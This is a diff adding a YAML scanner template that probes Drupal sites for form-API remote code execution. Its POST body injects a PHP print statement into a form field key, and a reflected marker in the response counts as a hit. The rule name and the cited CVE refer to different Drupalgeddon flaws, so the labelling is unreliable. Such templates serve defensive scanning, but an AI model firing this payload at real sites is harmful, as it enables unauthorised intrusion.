@@ -1,0 +1,17 @@
+name: poc-drupal-drupalgeddon
+transport: http
+rules:
+  r0:
+    request:
+      method: POST
+      path: "/?q=node&destination=node"
+      headers:
+        Content-Type: "application/x-www-form-urlencoded"
+      body: "name[0%20%3Bprint%20%27sxel%27%3B%23%5D%5B%23type=markup%5D%5B%23markup=test&name[0]=test"
+    expression: response.status == 200 && response.body.bcontains("sxel")
+expression: r0()
+detail:
+  author: sxel
+  description: Drupal Drupalgeddon2 form API RCE probe (CVE-2018-7600)
+  severity: critical
+  tags: drupal,php,rce
